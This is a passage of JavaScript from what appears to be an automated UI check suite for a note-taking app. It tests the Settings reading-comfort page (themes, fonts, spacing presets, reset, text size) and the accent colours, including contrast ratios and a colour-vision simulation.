    const ok = !S.modal && D.bridge?.note === 'Start with the parser bug.' && D.bridge.starters.length === 3 && D.bridge.starters[0] === first && D.bridge.memo?.file === SAMPLE_MEMO && (!tk || (t1[1] === 'done' ? tk.done : tk.due === 'Upcoming')) && D.tasks.length > tasks0;
    out.numbers.buildF.flows.finish = `${sorted.length} sorted · bridge ${D.bridge?.starters?.length} starters · tasks +${D.tasks.length - tasks0}`; if (!ok) iss('Build F Finish', out.numbers.buildF.flows.finish);
    UI.tstate = 'idle'; T.link = ''; WRAP.lp = lpFromSample(); S.modal = 'launch'; renderAll(); await launchGo();
    out.numbers.buildF.flows.launch = `timer ${UI.tstate} · linked ${T.link} · ${Math.round(T.target / 60)} min · quick timer ${qtOpen()}`;
    if (UI.tstate !== 'running' || T.link !== 'task:' + first || !qtOpen() || S.modal) iss('Build F Launch', out.numbers.buildF.flows.launch);
    set({ widgets: 'none', tstate: 'running', modal: null }); }
  if (app.querySelector('.titlebar [data-act="wrap"][data-soon]')) iss('Build F wrap-up button still Coming soon', '');
  /* ---- end Build F ---- */
  /* ---- Build E: Settings → Reading & comfort as R31's cards (4 screens × 2 fonts × 3 themes, and all nine themes), the spacing presets
     and Custom, the fonts in 5 states on both pages, the font flow, Reset and Undo, a click keeps the page's place, Text size,
     and every Settings segmented control on one line (Focus & nudges' "45 min" wrapped at 1366 × 768) ---- */
  { out.numbers.buildE = { page: {}, themes: {}, fonts: {}, flows: {}, seg: {} };
    const E = out.numbers.buildE, saveWas = window.saveSettings, a11yWas = { ...S.a11y }, useWas = FE.use;
    window.saveSettings = () => {};   // nothing the check clicks is saved
    const hOf = el => Math.round(el.getBoundingClientRect().height), open = () => { S.setSec = 'appearance'; S.modal = 'settings'; renderAll(); out.combos++; };
    const pane = () => app.querySelector('.modal--settings .settings-pane'), cards = () => [...app.querySelectorAll('.settings-pane .cf-card')];
    const ONSCALE = [22, 24, 28, 32, 36];   // 22 = the toggles, 40 × 22 (kept, 2026-10-16)
    const ctrls = root => [...root.querySelectorAll('button, input:not([type="range"]), select')].filter(el => el.offsetWidth && !el.closest('.cf-page, .seg'))
      .map(el => [el, hOf(el)]).concat([...root.querySelectorAll('.seg')].filter(el => el.offsetWidth).map(el => [el, hOf(el)]));
    feDemo('none'); FE.page = false; FE.custom = new Set();
    for (const sc of Object.keys(SCREENS)) for (const font of ['opendyslexic', 'system']) for (const theme of ['obsidian', 'paper', 'contrast']) {
      set({ screen: sc, view: 'notes', sample: 'typical', font, theme, textsize: 'm' }); open();
      const k = `${sc}/${font}/${theme}`, p = pane(), cs = cards();
      measure(`buildE/${k}`); inside('.modal--settings', k);
      if (p.scrollWidth > p.clientWidth + 1) iss('Build E page scrolls sideways', k);
      const titles = cs.map(c => c.querySelector('.cf-card-title')?.textContent).join('/'), vals = cs.map(c => c.querySelector('.cf-card-val')?.textContent.trim());
      if (titles !== 'Theme/Text/Spacing/Reading aids/Motion' || vals.some(v => !v)) iss('Build E cards', `${k}: ${titles} · ${vals}`);
      if (!p.querySelector(':scope > .cf-page-head .cf-reset') || p.querySelector(':scope > .card.card-pad')) iss('Build E page head', k);
      const gaps = cs.slice(1).map((c, i) => Math.round(c.getBoundingClientRect().top - cs[i].getBoundingClientRect().bottom));
      if (gaps.some(g => g !== 16)) iss('Build E cards not 16px apart', `${k}: ${gaps}`);
      const off = ctrls(p).filter(([, h]) => !ONSCALE.includes(h)); if (off.length) iss('Build E control off the 24/28/32/36 scale', `${k}: ${off.slice(0, 3).map(([el, h]) => `${el.className || el.tagName} ${h}`)}`);
      const sw = p.querySelector('.swatch'), fo = p.querySelector('.font-opt'), more = p.querySelector('[data-act="fonts-more"]'), own = p.querySelector('.cf-font-acts [data-act="font-own"]');
      if (hOf(sw) !== 36 || hOf(fo) !== 36 || hOf(more) !== 32 || hOf(own) !== 32 || !more.classList.contains('btn--tint') || !/\d+ free/.test(more.textContent)) iss('Build E swatch / font / More fonts sizes', `${k}: ${hOf(sw)}/${hOf(fo)}/${hOf(more)}/${hOf(own)}`);
      p.querySelectorAll('.cf-card .set-row').forEach(r => { if (!r.querySelector('.set-label')) iss('Build E row without a label', k); if (px(r).r > px(r.closest('.cf-card')).r + .5) iss('Build E row past its card', k); });
      p.querySelectorAll('.seg-opt').forEach(o => { if (hOf(o) > 28.5) iss('Build E segment option wraps', `${k}: ${o.textContent}`); });
      p.querySelectorAll('.swatch .truncate, .font-opt .truncate, .cf-card-val').forEach(el => { if (el.scrollWidth > el.clientWidth + 1 && !el.title && !el.closest('.cf-card-head')) iss('Build E name cut', `${k}: ${el.textContent}`); });
      const tg = p.querySelector('.toggle'); if (tg.offsetWidth !== 40 || tg.offsetHeight !== 22) iss('Build E toggle not 40 × 22', `${k}: ${tg.offsetWidth}×${tg.offsetHeight}`);
      if (font === 'opendyslexic' && theme === 'obsidian') E.page[sc] = `pane ${p.clientWidth}×${p.clientHeight}, page ${p.scrollHeight}px · cards ${cs.map(hOf).join('/')}px, ${gaps[0]}px apart · swatch ${sw.offsetWidth}×${hOf(sw)} · font ${fo.offsetWidth}×${hOf(fo)} · More fonts ${more.offsetWidth}×${hOf(more)} · controls ${[...new Set(ctrls(p).map(x => x[1]))].sort((a, b) => a - b).join('/')}px`;
    }
    for (const w of [1000, 800, 683]) for (const font of ['opendyslexic', 'system']) {   // narrower windows (snapped to half a screen): a narrower page, controls under their labels
      set({ screen: '1366x768', font, theme: 'obsidian' }); frame.style.width = w + 'px'; open();
      const k = `${w}x768/${font}`, p = pane(), cs = cards(); inside('.modal--settings', k);
      if (p.scrollWidth > p.clientWidth + 1) iss('Build E page scrolls sideways', k);
      p.querySelectorAll('.cf-card .set-row, .cf-card .seg, .cf-card .swatch, .cf-card .font-opt, .cf-font-acts .btn').forEach(el => { if (px(el).r > px(el.closest('.cf-card')).r + .5) iss('Build E past its card', `${k}: ${String(el.className).slice(0, 24)}`); });
      p.querySelectorAll('.seg-opt').forEach(o => { if (hOf(o) > 28.5) iss('Build E segment option wraps', `${k}: ${o.textContent}`); });
      const under = [...p.querySelectorAll('.cf-row--seg')].filter(r => r.querySelector('.cf-ctl').getBoundingClientRect().top >= r.querySelector('.cf-row-text').getBoundingClientRect().bottom - 1).length;
      if (font === 'opendyslexic') E.page[`${w}x768`] = `pane ${p.clientWidth}px · page ${p.scrollHeight}px · ${under} of ${p.querySelectorAll('.cf-row--seg').length} choices under their label · cards ${cs.map(hOf).join('/')}px`;
    }
    size('1366x768');
    for (const [th] of THEMES) {   // every theme: the samples and the card values stay readable
      set({ screen: '1920x1080', theme: th, font: 'opendyslexic' }); open();
      const sample = app.querySelector('.cf-card--spacing .cf-body p'), val = app.querySelector('.cf-card-val'), bg = getComputedStyle(app.querySelector('.cf-page')).backgroundColor;
      const t = ratio(getComputedStyle(sample).color, bg), m = ratio(getComputedStyle(val).color, getComputedStyle(app.querySelector('.cf-card')).backgroundColor);
      E.themes[th] = `sample ${t}:1 · card value ${m}:1`; if (t < 4.5 || m < 4.5) iss('Build E contrast under AA', `${th}: ${E.themes[th]}`);
      if (!app.querySelector(`.swatch--${th}[aria-pressed="true"]`)) iss('Build E picked theme not marked', th);
    }
    set({ theme: keep.reader.theme || 'obsidian' });
    // the presets and Custom: each preset sets its value; Custom shows the slider and focuses it; Custom again hides it
    { set({ screen: '1366x768', sample: 'typical' }); open(); const got = [];
      for (const [k, opts] of Object.entries(CF_PRESETS)) for (const [v, l] of opts) { app.querySelector(`[data-act="cf-preset"][data-k="${k}"][data-v="${v}"]`).click(); if (S.a11y[k] !== v || app.querySelector(`[data-act="cf-preset"][data-k="${k}"][aria-pressed="true"]`)?.textContent !== l) got.push(`${k}=${v}`); }
      if (got.length) iss('Build E preset not applied', got.join(', '));
      app.querySelector('[data-act="cf-preset"][data-k="letter"][data-v="0.05"]').click(); const doc0 = parseFloat(getComputedStyle(app).getPropertyValue('--editor-letter-spacing'));
      app.querySelector('[data-act="cf-preset"][data-k="width"][data-v="65"]').click(); const mw = getComputedStyle(app).getPropertyValue('--editor-max-width').trim();
      app.querySelector('[data-act="cf-custom"][data-v="line"]').click(); const rng = app.querySelector('.cf-custom input[data-k="line"]'), focused = document.activeElement === rng;
      app.querySelector('[data-act="cf-custom"][data-v="line"]').click(); const hidden = !app.querySelector('.cf-custom input[data-k="line"]');
      app.querySelector('[data-act="cf-preset"][data-k="letter"][data-v="0"]').click(); const sum = app.querySelector('.cf-card--spacing .cf-card-val').textContent;
      S.a11y.word = .14; renderAll(); const odd = !!app.querySelector('.cf-custom input[data-k="word"]') && app.querySelector('[data-act="cf-custom"][data-v="word"]').getAttribute('aria-pressed') === 'true';
      E.flows.presets = `Wide → ${doc0} em · Narrow → ${mw} · Custom shows the slider ${!!rng}, focused ${focused}, hides again ${hidden} · Normal → "${sum.split(' · ')[0]}" · 0.14 em shows Custom ${odd}`;
      if (doc0 !== .05 || mw !== '65ch' || !rng || !focused || !hidden || !/^Letters Normal/.test(sum) || !odd) iss('Build E presets and Custom', E.flows.presets);
      Object.assign(S.a11y, { letter: 0, word: 0, line: 1.85, width: 100 }); FE.custom = new Set(); }
    // the fonts in 5 states, on the Text card and on More fonts, at every screen
    const FONT_OPTS = { none: 4, downloading: 5, added: 7, badfile: 4, offline: 6 };
    for (const sc of Object.keys(SCREENS)) for (const state of Object.keys(FONT_OPTS)) for (const page of [false, true]) {
      feDemo(state); FE.page = page; set({ screen: sc, view: 'notes', font: 'opendyslexic' }); open();
      const k = `${sc}/${state}/${page ? 'more' : 'card'}`, p = pane(); measure(`buildE/fonts/${k}`); inside('.modal--settings', k);
      if (p.scrollWidth > p.clientWidth + 1) iss('Build E fonts page scrolls sideways', k);
      if (!page) {
        const opts = p.querySelectorAll('.cf-card--text .font-opt'), chips = [...p.querySelectorAll('.cf-card--text .font-opt .chip')].map(c => c.textContent);
        if (opts.length !== FONT_OPTS[state]) iss('Build E font options', `${k}: ${opts.length}`);
        if (state === 'added' && chips.join(',') !== 'Added,Added,Your file') iss('Build E Added / Your file chips', `${k}: ${chips}`);
        if (state === 'downloading' && !p.querySelector('.font-opt[disabled] [data-font-pct]')) iss('Build E downloading font not greyed', k);
        if (state === 'offline' && !/offline/.test(p.querySelector('.cf-card--text').textContent)) iss('Build E offline line missing', k);
      } else {
        const rows = [...p.querySelectorAll('.cf-font-row')], dls = [...p.querySelectorAll('[data-act="font-dl"]')], dis = dls.filter(b => b.disabled);
        if (p.querySelector('.view-title')?.textContent !== 'More fonts' || !p.querySelector('[data-act="fonts-back"]')) iss('Build E More fonts head', k);
        if (rows.length < feFonts().length || rows.some(r => !r.querySelector('.cf-font-sample') || !/SIL Open Font License|copied into/.test(r.querySelector('.ai-meta').textContent))) iss('Build E font rows', `${k}: ${rows.length}`);
        rows.forEach(r => { if (px(r).r > px(r.closest('.card')).r + .5) iss('Build E font row past the card', k); r.querySelectorAll('.btn').forEach(b => { if (b.offsetWidth && hOf(b) !== 28) iss('Build E font row button not 28px', `${k}: ${b.textContent} ${hOf(b)}`); }); });
        if (state === 'offline' && (dis.length !== dls.length || dis.some(b => !b.title) || !p.querySelector('.alert--warning'))) iss('Build E offline: downloads not disabled with a reason', `${k}: ${dis.length}/${dls.length}`);
        if (state !== 'offline' && dis.length) iss('Build E download disabled while online', k);
        if (state === 'downloading' && !p.querySelector('.progress [data-font-bar] ') && !p.querySelector('[data-font-bar]')) iss('Build E progress missing', k);
        if (state === 'downloading' && !p.querySelector('[data-act="font-cancel"]')) iss('Build E Cancel missing', k);
        if (state === 'added' && (!p.querySelector('[data-act="font-use"]') || !p.querySelector('[data-act="font-remove"]'))) iss('Build E Use / Remove missing', k);
        if (sc === '1366x768') E.fonts[state] = `${rows.length} rows · ${dls.length} Download (${dis.length} disabled) · ${p.querySelectorAll('[data-act="font-use"]').length} Use · ${p.querySelectorAll('[data-act="font-remove"]').length} Remove · page ${p.scrollHeight}px`;
      }
      if (state === 'badfile') { const al = p.querySelector('.alert--danger.cf-alert'); if (!al || !/Luciole-Bold\.woff2/.test(al.textContent) || !al.querySelector('[data-act="font-own"]') || hOf(al) > 64) iss('Build E bad file line', `${k}: ${al ? hOf(al) : 'none'}px`); }
    }
    // the font flow (demo): More fonts → Download → ready → Use sets the app font → a built-in font takes over → Use again → Remove goes back
    { feDemo('none'); FE.page = false; set({ screen: '1920x1080', font: 'opendyslexic' }); open();
      app.querySelector('[data-act="fonts-more"]').click(); const onPage = FE.page && document.activeElement?.dataset.act === 'fonts-back' && pane().scrollTop === 0;
      app.querySelector('[data-act="font-dl"][data-v="literata"]').click(); const dl = !!app.querySelector('[data-act="font-cancel"][data-v="literata"]');
      feDemoFinish('literata'); renderAll(); app.querySelector('[data-act="font-use"][data-v="literata"]').click(); await wait(20);
      const appFont = getComputedStyle(app).fontFamily, inUse = !!app.querySelector('[data-font-row="literata"] .chip--success');
      app.querySelector('[data-act="fonts-back"]').click(); const backFocus = document.activeElement?.dataset.act;
      app.querySelector('[data-act="cf-font"][data-v="lexend"]').click(); const builtIn = getComputedStyle(app).fontFamily, useAfter = FE.use;
      app.querySelector('[data-act="font-use"][data-v="literata"]').click(); await wait(20); FE.page = true; renderAll();
      app.querySelector('[data-act="font-remove"][data-v="literata"]').click(); const back = getComputedStyle(app).fontFamily;
      app.querySelector('[data-act="font-own"]').click(); const own = !!feOwn().length && !!app.querySelector('[data-font-row="own-luciole"]');
      E.flows.fonts = `More fonts opens at the top ${onPage} · Download → Cancel shown ${dl} · Use → ${appFont.split(',')[0]} (In use ${inUse}) · Back focuses ${backFocus} · Lexend → ${builtIn.split(',')[0]}, use "${useAfter}" · Remove → ${back.split(',')[0]} · your file listed ${own}`;
      if (!onPage || !dl || !/nvf-literata/.test(appFont) || !inUse || backFocus !== 'fonts-more' || !/Lexend/.test(builtIn.split(',')[0]) || useAfter || !/Lexend/.test(back.split(',')[0]) || !own) iss('Build E font flow', E.flows.fonts);
      FE.page = false; set({ font: 'opendyslexic' }); }
    // Reset to defaults: greyed out with nothing changed; one change in each card; Reset asks first (Build G: R33 locked "Asks first, on the page")
    { feDemo('added'); FE.page = false; Object.assign(S.a11y, { letter: 0, word: 0, line: 1.85, width: 100, ruler: false, rulerLines: 2, bionic: false, still: false }); FE.custom = new Set();
      set({ screen: '1366x768', theme: 'obsidian', font: 'opendyslexic', textsize: 'm' }); open();
      const btn = () => app.querySelector('.settings-pane .cf-reset'), grey = btn().disabled && !!btn().title;
      READER.theme = 'sepia'; READER.textsize = 'l'; FE.use = 'lexend-exa'; Object.assign(S.a11y, { letter: .1, width: 65, ruler: true, rulerLines: 3, bionic: true, still: true }); applyReader(); renderAll();
      const sig = () => JSON.stringify([READER.theme, READER.font, READER.textsize, FE.use, S.a11y.letter, S.a11y.width, S.a11y.ruler, S.a11y.rulerLines, S.a11y.bionic, S.a11y.still]), changed = sig();
      btn().click(); const asked = !!app.querySelector('.cf-confirm') && sig() === changed, cancelFocus = document.activeElement?.dataset.act === 'cf-ask-no';
      app.querySelector('[data-act="cf-reset-yes"]').click(); const reset = sig(), gone = !app.querySelector('.cf-confirm'), after = btn()?.disabled;
      E.flows.reset = `greyed with nothing changed ${grey} · Reset asks ${asked}, Cancel focused ${cancelFocus} · Reset to defaults → ${reset} · question gone ${gone} · greyed again ${after}`;
      if (!grey || !asked || !cancelFocus || reset !== JSON.stringify(['obsidian', 'opendyslexic', 'm', '', 0, 100, false, 2, false, false]) || !gone || !after) iss('Build E Reset', E.flows.reset);
      clearTimeout(cfReset.t); FE.undo = null; S.toast = null; READER.theme = 'obsidian'; READER.textsize = 'm'; FE.use = ''; Object.assign(S.a11y, { letter: 0, width: 100, ruler: false, rulerLines: 2, bionic: false, still: false }); applyReader(); }
    // a click keeps the scrolled page where it is
    for (const sc of ['1920x1080', '1366x768']) { feDemo('none'); set({ screen: sc }); open(); const p = pane(); p.scrollTop = p.scrollHeight; const y0 = p.scrollTop;
      app.querySelector('[data-act="a11y-toggle"][data-v="bionic"]').click(); app.querySelector('[data-act="a11y-toggle"][data-v="bionic"]').click(); const y1 = pane().scrollTop;
      E.flows['scroll/' + sc] = `${Math.round(y0)} → ${Math.round(y1)}px`; if (Math.abs(y1 - y0) > 1) iss('Build E a click moved the page', `${sc}: ${E.flows['scroll/' + sc]}`); }
    // Text size: the note text is 14 / 15 / 17 / 19px; the rest of the app stays Medium
    { S.modal = null; const got = []; set({ screen: '1366x768', view: 'notes', sample: 'stress', textsize: 'm' }); const uiM = getComputedStyle(app.querySelector('.settings-nav, .status-bar, .app-header') || app).fontSize;
      for (const [ts, , want] of TEXT_SIZES) { set({ screen: '1366x768', view: 'notes', sample: 'stress', textsize: ts }); const d = app.querySelector('.doc'); const f = d ? parseFloat(getComputedStyle(d).fontSize) : null, ui = getComputedStyle(app.querySelector('.settings-nav, .status-bar, .app-header') || app).fontSize;
        const sp = (() => { pnReset(); const t = mkTab('note', D.notes[3].id); S.tabs.push(t); pnSplitNote(t.id); out.combos++; const o = Math.max(...[...app.querySelectorAll('.pane .view')].map(v => v.scrollWidth - v.clientWidth)); pnReset(); setUI('view', 'notes'); return o; })();   // Build M · R44: the note split
        if (sp > 1) iss('Build E text size: a split pane scrolls sideways', `${ts}: ${sp}px`);
        got.push(`${ts} ${f}px (UI ${ui}, split panes ${sp > 1 ? sp + 'px too wide' : 'fit'})`); if (f !== want || ui !== uiM) iss('Build E text size', `${ts}: note ${f}px, UI ${ui} (Medium: ${uiM})`); }
      E.flows.textSize = got.join(' · '); set({ textsize: 'm', sample: 'typical' }); }
    // every segmented control in Settings keeps its options on one line, on every page and screen (Focus & nudges' "45 min" at 1366)
    for (const sc of Object.keys(SCREENS)) for (const [sec] of SET_SECTIONS) { if (SET_SOON[sec]) continue;
      S.setSec = sec; feDemo('none'); FE.page = false; set({ screen: sc, modal: 'settings' });
      const bad = [...app.querySelectorAll('.settings-pane .seg-opt')].filter(o => o.offsetWidth && (hOf(o) > 28.5 || o.getClientRects().length > 1));
      if (bad.length) iss('Build E segment on two lines', `${sc}/${sec}: ${bad.map(o => o.textContent).join(', ')}`);
      app.querySelectorAll('.settings-pane .set-row').forEach(r => { if (px(r).r > px(pane()).r + .5) iss('Build E row past the page', `${sc}/${sec}`); });
      if (sec === 'focus') E.seg[sc] = [...app.querySelectorAll('.settings-pane .seg-opt')].map(o => `${o.textContent} ${hOf(o)}px`).join(', '); }
    feDemo(null); FE.page = false; FE.custom = new Set(); FE.use = useWas; Object.assign(S.a11y, a11yWas); window.saveSettings = saveWas; S.setSec = 'appearance'; S.modal = null; applyComfort(); }
  /* ---- Build G (R33, locked 2026-10-16): every accent on every theme, its contrast measured as drawn; your own colour passing and
     failing, with the fix, and following you to the other themes; colour vision on the state surfaces (Machado 2009 simulation, OKLab);
     Reset asking first; each card's Reset with Undo; clicks keep the page's place; the Theme card at 4 screens × 3 themes × picker ×
     colour vision ---- */
  { out.numbers.buildG = { accents: {}, lowest: {}, custom: {}, cvd: {}, flows: {}, page: {} };
    const G = out.numbers.buildG, saveWas = window.saveSettings, a11yWas = { ...S.a11y }, acWas = { ...AC, picks: { ...AC.picks } };
    window.saveSettings = () => {};   // nothing the check clicks is saved
    const hOf = el => Math.round(el.getBoundingClientRect().height), pane = () => app.querySelector('.modal--settings .settings-pane');
    const open = () => { S.setSec = 'appearance'; S.modal = 'settings'; FE.page = false; renderAll(); out.combos++; };
    const A11Y_DEF = { letter: 0, word: 0, line: 1.85, width: 100, ruler: false, rulerLines: 2, bionic: false, still: false };
    const acReset = () => { clearTimeout(AC.saveT); Object.assign(AC, { picks: {}, custom: '', customTheme: '', cvd: 'off', open: false, draft: null }); applyAccent(); };
    const hexOf = c => rgbHex(c.match(/[\d.]+/g).slice(0, 3).map(Number));
    const drawn = () => { const bg = colorOf('--bg'), card = colorOf('--card'), panel = colorOf('--panel'), a = colorOf('--accent'), ab = colorOf('--accent-bg'), at = colorOf('--accent-text'), on = colorOf('--on-accent');
      return { a: hexOf(a), ui: Math.min(ratio(a, bg), ratio(a, card), ratio(a, panel)), btn: ratio(on, a), txt: Math.min(ratio(at, bg), ratio(at, card), ratio(at, panel), ratio(at, ab)) }; };
    const passes = d => d.ui >= 3 && d.btn >= 4.5 && d.txt >= 4.5;
    const hx = () => pane().querySelector('#acc-hex');
    const type = v => { const h = hx(); h.value = v; h.setSelectionRange(v.length, v.length); h.dispatchEvent(new Event('input', { bubbles: true })); };
    feDemo('none'); acReset(); Object.assign(S.a11y, A11Y_DEF); FE.custom = new Set();

    // every accent on every theme: 6–8 chips, violet (lavender) first and marked, each drawn as listed and passing
    let n = 0;
    for (const [th] of THEMES) {
      set({ screen: '1920x1080', theme: th, view: 'notes', sample: 'typical' }); acReset(); open();
      const cols = ['--bg', '--card', '--panel'].map(v => hexOf(colorOf(v)));
      if (cols.join() !== THEME_COL[th].join()) iss('Build G THEME_COL differs from the theme', `${th}: ${cols}`);
      const chips = [...pane().querySelectorAll('.acc-pick:not(.acc-custom-pick)')];
      if (chips.length !== ACCENT_SETS[th].length || chips.length < 6 || chips.length > 8) iss('Build G accent count', `${th}: ${chips.length}`);
      if (chips[0]?.getAttribute('aria-pressed') !== 'true' || !pane().querySelector('.acc-custom-pick')) iss('Build G default accent or Custom… missing', th);
      G.accents[th] = ACCENT_SETS[th].map(([id, name, hex]) => {
        pane().querySelector(`[data-act="acc-pick"][data-v="${id}"]`).click(); n++; out.combos++;
        const d = drawn(), on = pane().querySelector('[data-act="acc-pick"][aria-pressed="true"]')?.dataset.v, warn = !!pane().querySelector('.acc-note.alert--warning'), hov = hexOf(colorOf('--accent-hover'));
        if (!passes(d) || on !== id || warn || d.a !== hex || hov === hex) iss('Build G accent', `${th}/${id}: fill ${d.ui} · on it ${d.btn} · text ${d.txt} · marked ${on} · warning ${warn} · drawn ${d.a} · hover ${hov}`);
        ['ui', 'btn', 'txt'].forEach(k => { G.lowest[k] = Math.min(G.lowest[k] ?? 99, d[k]); });
        return `${name} ${d.ui}/${d.btn}/${d.txt}`; }).join(' · ');
    }
    G.flows.accents = `${n} accents over ${THEMES.length} themes · lowest: fill ${G.lowest.ui}:1 against page, card and sidebar (needs 3) · text on it ${G.lowest.btn}:1 (needs 4.5) · accent text ${G.lowest.txt}:1 (needs 4.5)`;
    if (n !== 65) iss('Build G accents in all', n);

    // typing a colour: Custom… opens with the field focused; "0e7" gets its # and isn't a colour yet; #0e7490 applies as you type; Enter stays
    { set({ screen: '1366x768', theme: 'cream' }); acReset(); open();
      pane().querySelector('.acc-custom-pick').click(); const focused = document.activeElement === hx();
      type('0e7'); const partial = hx().value, invalid = hx().getAttribute('aria-invalid') === 'true' && !!pane().querySelector('.acc-custom .field-error');
      type('#0e7490'); const live = hexOf(colorOf('--accent')), box = pane().querySelector('.acc-color').value;
      hx().dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); const stay = document.activeElement === hx() && hx().value === '#0e7490';
      const sizes = [hOf(hx()), hOf(pane().querySelector('.acc-color'))].join('/');
      G.flows.typing = `Custom… focuses the hex field ${focused} · "0e7" → "${partial}", not a colour yet ${invalid} · #0e7490 → accent ${live}, colour box ${box} · Enter keeps the field ${stay} · field / box ${sizes}px`;
      if (!focused || partial !== '#0e7' || !invalid || live !== '#0e7490' || box !== '#0e7490' || !stay || sizes !== '32/32') iss('Build G typing a colour', G.flows.typing); }

    // a colour that passes and one that fails, on every theme; the fail's one button applies the nearest shade that passes
    for (const [th] of THEMES) {
      const dark = darkTheme(th), [pass, fail] = dark ? ['#e6a1ff', '#1e3a8a'] : ['#b5179e', '#f5c518'];
      set({ screen: '1366x768', theme: th }); acReset(); AC.open = true; open(); out.combos += 2;
      type(pass); const okNote = !!pane().querySelector('.acc-note.alert--success'), dp = drawn();
      type(fail); const warn = pane().querySelector('.acc-note.alert--warning'), line = warn?.querySelector('span')?.textContent || '', fixBtn = warn?.querySelector('[data-act="acc-fix"]'), df = drawn();
      const fix = fixBtn?.dataset.v, fixH = fixBtn ? hOf(fixBtn) : 0, label = fixBtn?.textContent.trim(); fixBtn?.click(); const dx = drawn(), gone = !pane().querySelector('.acc-note.alert--warning');
      G.custom[th] = `${pass} passes (${dp.ui}/${dp.btn}/${dp.txt}, "Stands out" ${okNote}) · ${fail} ${df.ui}/${df.btn}: "${line}" · "${label}" → ${dx.a} (${dx.ui}/${dx.btn}/${dx.txt}), line gone ${gone}`;
      if (!okNote || !passes(dp) || !warn || passes(df) || line !== `This colour is hard to see on ${themeName(th)}.` || !fix || !passes(dx) || dx.a !== fix || !gone || fixH !== 28 || label !== `Use a ${dark ? 'lighter' : 'darker'} shade`) iss('Build G custom colour', `${th}: ${G.custom[th]}`);
    }
    // your colour follows you: chosen (and left failing) on Warm cream, shaded to pass on the other eight; the line stays on cream with the picker shut
    { set({ screen: '1366x768', theme: 'cream' }); acReset(); AC.open = true; open(); type('#f5c518'); hx().dispatchEvent(new Event('change', { bubbles: true }));
      pane().querySelector('.acc-custom-pick').click(); const shut = !hx(), still = pane().querySelector('.acc-row .acc-note.alert--warning'), stillH = still ? hOf(still) : 0;
      const follow = THEMES.filter(([th]) => th !== 'cream').map(([th]) => { set({ theme: th }); open(); const d = drawn(), chip = pane().querySelector('.acc-custom-pick'), warn = !!pane().querySelector('.acc-note.alert--warning');
        if (!passes(d) || chip.getAttribute('aria-pressed') !== 'true' || warn || !chip.textContent.includes(d.a)) iss('Build G your colour on another theme', `${th}: ${d.a} ${d.ui}/${d.btn}/${d.txt} · warning ${warn} · chip "${chip.textContent}"`);
        return `${th} ${d.a}`; });
      set({ theme: 'cream' }); open(); const exact = drawn().a;
      G.flows.follow = `#f5c518 chosen on Warm cream: the picker shuts ${shut}, the line stays (${stillH}px) · cream keeps ${exact} · ${follow.join(' · ')}`;
      if (!shut || !still || exact !== '#f5c518' || stillH > 64) iss('Build G your colour on its own theme', G.flows.follow); }

    // colour vision: on all nine themes the state colours change and stay apart (Machado 2009 at full strength, OKLab distance × 100:
    // 2 is barely visible, 10 clearly apart), state text stays 4.5:1, and every state gets a shape; Off keeps today's look
    const MACHADO = { protan: [[.152286, 1.052583, -.204868], [.114503, .786281, .099216], [-.003882, -.048116, 1.051998]],
      deutan: [[.367322, .860646, -.227968], [.280085, .672501, .047413], [-.01182, .04294, .968881]],
      tritan: [[1.255528, -.076749, -.178779], [-.078411, .930809, .147602], [.004733, .691367, .3039]] };
    const lin = v => { v /= 255; return v <= .04045 ? v / 12.92 : ((v + .055) / 1.055) ** 2.4; };
    const oklab = ([r, g, b]) => { const l = Math.cbrt(.4122214708 * r + .5363325363 * g + .0514459929 * b), m = Math.cbrt(.2119034982 * r + .6806995451 * g + .1073969566 * b), s = Math.cbrt(.0883024619 * r + .2817188376 * g + .6299787005 * b);
      return [.2104542553 * l + .793617785 * m - .0040720468 * s, 1.9779984951 * l - 2.428592205 * m + .4505937099 * s, .0259040371 * l + .7827717662 * m - .808675766 * s]; };
    const sim = (c, kind) => { const rgb = c.match(/[\d.]+/g).slice(0, 3).map(Number).map(lin); return MACHADO[kind].map(r => Math.max(0, Math.min(1, r[0] * rgb[0] + r[1] * rgb[1] + r[2] * rgb[2]))); };
    const apart = kind => { const L = ['--success', '--warning', '--danger'].map(v => oklab(sim(colorOf(v), kind))); let m = 99;
      for (let i = 0; i < 3; i++) for (let j = i + 1; j < 3; j++) m = Math.min(m, 100 * Math.hypot(...L[i].map((x, k) => x - L[j][k]))); return +m.toFixed(1); };
    for (const [th] of THEMES) {
      const was = {};
      for (const cv of ['off', 'rg', 'tri']) {
        set({ screen: '1366x768', theme: th }); acReset(); AC.cvd = cv; applyAccent(); open();
        const card = colorOf('--card'), bg = colorOf('--bg'), text = Math.min(...['--success-text', '--warning-text', '--danger-text'].map(v => Math.min(ratio(colorOf(v), card), ratio(colorOf(v), bg))));
        const smp = pane().querySelector('.cv-sample'), shapes = [...smp.querySelectorAll('.chip--success, .chip--warning, .chip--danger, .anchor')].filter(e => getComputedStyle(e, '::before').content !== 'none').length;
        const diamond = getComputedStyle(smp.querySelector('.status-dot.is-error')).transform !== 'none', stripes = getComputedStyle(smp.querySelector('.qt-bar[data-band="low"] > span')).backgroundImage !== 'none';
        const sets = ['--success', '--warning', '--danger', '--time-low'].map(colorOf).join(), marked = pane().querySelector('[data-act="set-cvd"][aria-pressed="true"]')?.dataset.v;
        const sep = cv === 'tri' ? { tritan: apart('tritan') } : { deutan: apart('deutan'), protan: apart('protan'), tritan: apart('tritan') };
        G.cvd[`${th}/${cv}`] = `${Object.entries(sep).map(([k, v]) => `${k} ${v}`).join(', ')} · state text ${text}:1 · ${shapes} of 5 shapes${diamond ? ', diamond' : ''}${stripes ? ', stripes' : ''}`;
        was[cv] = sep;
        const on = cv !== 'off', far = on && Object.entries(sep).filter(([k]) => cv === 'tri' ? k === 'tritan' : k !== 'tritan').some(([, v]) => v < 10);
        if (text < 4.5 || marked !== cv || shapes !== (on ? 5 : 0) || diamond !== on || stripes !== on || far || (on && sets === was.offSets)) iss('Build G colour vision', `${th}/${cv}: ${G.cvd[`${th}/${cv}`]}`);
        if (!on) was.offSets = sets;
        if (on && !/Found/.test(cvLegend())) iss('Build G voice check legend', cv);
      }
    }
    // the state surfaces in the app itself: the status bar's save dot, an error alert, and the quick timer's time-left bar
    { const got = [];
      for (const cv of ['off', 'rg', 'tri']) {
        S.modal = null; acReset(); AC.cvd = cv; applyAccent(); set({ screen: '1920x1080', theme: 'paper', view: 'notes', state: 'error', widgets: 'timer', tstate: 'running', modal: null });   /* tstate: Build H, the Card draws its bar only while a timer runs; don't rely on what's left over */
        const dot = app.querySelector('.status-bar .status-dot.is-error'), al = app.querySelector('.alert--danger'), bar = app.querySelector('.qt-bar > span'), band = bar?.parentElement.dataset.band;
